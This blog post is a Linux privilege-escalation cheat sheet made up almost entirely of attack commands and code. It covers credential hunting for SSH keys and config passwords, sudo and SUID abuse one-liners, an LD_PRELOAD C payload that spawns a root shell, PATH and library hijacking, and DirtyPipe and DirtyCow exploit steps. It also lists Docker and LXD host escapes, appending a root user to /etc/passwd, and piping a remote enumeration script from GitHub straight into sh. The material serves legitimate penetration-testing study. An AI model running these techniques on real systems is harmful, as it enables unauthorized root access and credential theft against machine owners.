---
layout: post
title: Linux Privilege Escalation
date: 2025-04-10 16:13 +0300
categories: [Linux]
tags: [linux, privilege escalation]
---

## 1. Initial Enumeration

### Basic System Information

```bash
whoami
id
hostname
uname -a
cat /etc/os-release
lscpu
cat /etc/shells
echo $PATH
env
```

### Network Information

```bash
ip a
ifconfig or ip -a
route or netstat -rn
arp -a
cat /etc/hosts
netstat -tulpn
```

### Mounted Filesystems & Storage

```bash
df -h
lsblk
cat /etc/fstab | grep -v "#" | column -t
```

## 2. Users, Groups, & Authentication

### User Information

```bash
cat /etc/passwd
cat /etc/group
sudo -l
lastlog
w
```

### Command History & Credentials

```bash
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
cat ~/.bash_history | grep -i passw
```

### Credential Hunting

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
cat /etc/openvpn/auth.txt
cat /home/user/.irssi/config | grep -i passw
grep -r "password" /etc/     # Check config files for passwords
find / -name "id_rsa*" 2>/dev/null    # Look for SSH keys
find / -name "*.pgpass" 2>/dev/null   # PostgreSQL passwords
find / -name "credentials.xml" 2>/dev/null
```

## 3. Security Mechanisms & Defenses

### Check for Security Features

```bash
# Check for various security mechanisms
cat /proc/sys/kernel/randomize_va_space  # ASLR
sestatus  # SELinux
aa-status  # AppArmor
ufw status  # Uncomplicated Firewall
iptables -L  # iptables
systemctl status fail2ban  # Fail2ban
ps aux | grep snort  # Snort
```

## 4. File System Enumeration

### Special Files

```bash
# Hidden files & directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep bughra
find / -type d -name ".*" -ls 2>/dev/null

# Temporary files
ls -l /tmp /var/tmp /dev/shm

# Configuration & shell scripts
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

### Write Permissions

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## 5. Privilege Escalation Techniques

### SUID/SGID Binaries

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null   # SUID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null   # SUID+SGID
```

### Sudo Rights Abuse

```bash
sudo -l
# If tcpdump is allowed
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

# If apache2 is allowed
sudo apache2 -f /etc/shadow

# If vi is allowed
sudo vi
:!sh
```

### Linux Capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Cron Job Abuse

```bash
ls -la /etc/cron.daily/
cat /etc/crontab
systemctl list-timers --all    # Check systemd timers
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null   # Find writable files
```

### Logrotate Exploitation
Requirements:
- Write permissions on log files
- logrotate running as privileged user/root
- Vulnerable versions (3.8.6, 3.11.0, 3.15.0, 3.18.0)

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

### LD_PRELOAD Abuse

```c
// Compile with: gcc -fPIC -shared -o root.so root.c -nostartfiles
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Shared Object Hijacking

```bash
ldd /path/to/binary   # Check library dependencies
readelf -d /path/to/binary | grep PATH   # Check RUNPATH
```

### Path Abuse

```bash
PATH=.:${PATH}   # Add current directory to PATH
export PATH
```

Create malicious executable with same name as a trusted binary:
```bash
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

### Python Library Hijacking
Methods:
1. Wrong write permissions on library files
2. Library path abuse
3. PYTHONPATH environment variable abuse

```bash
python3 -c 'import sys; print("\n".join(sys.path))'   # List Python path
pip3 show [module]   # Check module location
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./script.py   # Exploit with PYTHONPATH
```

### NFS Privilege Escalation

```bash
showmount -e target_ip   # Check NFS shares
cat /etc/exports   # Check export configuration on target
```

Exploit no_root_squash:
```bash
sudo mount -t nfs target_ip:/share /mnt
# Create and compile setuid binary on mounted share
```

## 6. Kernel Exploits

### DirtyPipe Exploit (CVE-2022-0847)
Affects Linux kernel 5.8 through 5.16.11, 5.15.25, and 5.10.102
```bash
# Check kernel version
uname -r

# Compile the exploit
gcc -o dirtypipe dirtypipe.c

# Execute to get root shell
./dirtypipe
```

### DirtyCow Exploit (CVE-2016-5195)
Affects Linux kernel versions before 4.8.3

```bash
# Check kernel version
uname -r

# Common exploit variants
gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread cowroot.c -o cowroot
```

### Other Kernel Exploits to Check

```bash
# Check kernel version first
uname -a

# Common kernel exploits
# - CVE-2021-4034 (PwnKit) - Polkit vulnerability
# - CVE-2021-3156 (Baron Samedit) - Sudo vulnerability
# - CVE-2019-13272 - PTRACE_TRACEME
# - CVE-2017-16995 - eBPF exploit
```

## 7. Container Escapes

### Docker Escapes

```bash
# Check Docker group membership
groups

# If Docker socket is accessible
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# With direct access to Docker binary
docker run --rm -d --privileged -v /:/hostsystem ubuntu

# Check for insecure Docker configurations
docker info
```

### LXC/LXD Escapes

```bash
# Import image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# Create privileged container
lxc init alpine r00t -c security.privileged=true

# Mount host filesystem
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# Start container and get shell
lxc start r00t
lxc exec r00t /bin/sh
```

## 8. Restricted Shell Escapes

Methods:
- Command substitution: `ls -l $(pwd)`
- Command chaining with shell metacharacters
- Environment variable modification
- Shell functions

```bash
echo "$(<a.txt)"   # Command substitution to read files

# Common escape techniques
vi
:set shell=/bin/bash
:shell

python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
```

## 9. Service Exploitation

### Systemd Service Files

```bash
# Look for writable service files
find /etc/systemd/system -type f -exec ls -la {} \; 2>/dev/null
find /lib/systemd/system -type f -exec ls -la {} \; 2>/dev/null

# Check if you can enable/start services
systemctl list-unit-files | grep enabled
```

### SUID Exploitation with GTFOBins

Check for SUID binaries that can be exploited via GTFOBins:
```bash
find / -perm -4000 -type f -exec basename {} \; 2>/dev/null | xargs -I{} sh -c 'echo {} && curl -s https://gtfobins.github.io/gtfobins/{}/ | grep -A 5 "SUID"'
```

## 10. Miscellaneous Techniques

### Hijacking Tmux Sessions

```bash
ps aux | grep tmux   # Find tmux sessions
ls -la /shareds      # Check permissions of tmux socket
tmux -S /shareds     # Connect to the socket
```

### Passive Traffic Capture

```bash
tcpdump -i eth0 -A -s0 port http or port ftp or port smtp or port imap
```

### Writing to /etc/passwd

```bash
openssl passwd -1 -salt xyz password   # Generate password hash
echo "newroot:hash:0:0:root:/bin/bash" >> /etc/passwd
```

### PAM Configuration Issues

```bash
cat /etc/pam.d/sudo   # Check PAM configuration
cat /etc/security/access.conf
```

### Automated Enumeration Tools

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download and run LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Download and run pspy (process snooper)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```
